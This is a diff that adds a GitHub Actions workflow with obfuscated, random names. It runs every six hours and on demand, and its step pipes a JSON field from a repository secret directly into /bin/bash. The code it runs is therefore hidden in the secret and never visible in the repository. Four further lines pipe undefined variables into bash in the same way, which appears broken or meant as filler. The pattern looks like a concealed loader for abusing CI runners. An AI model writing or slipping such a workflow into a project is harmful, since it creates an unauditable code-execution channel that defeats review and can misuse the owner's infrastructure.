@@ -1,0 +1,20 @@
+name: fnjcjkkk
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fnjcjkkk
+        env:
+          dgxrv53: ${{ secrets.dgxrv53 }}
+        run: |
+          echo $dgxrv53 | jq -r .yyt61560 | /bin/bash
+          echo $zydiq645 | jq -r .cnsl472 | /bin/bash
+          echo $shbvg5 | jq -r .z065 | /bin/bash
+          echo $v0 | jq -r .d4545 | /bin/bash
+          echo $rfsqt62 | jq -r .esw4 | /bin/bash
+
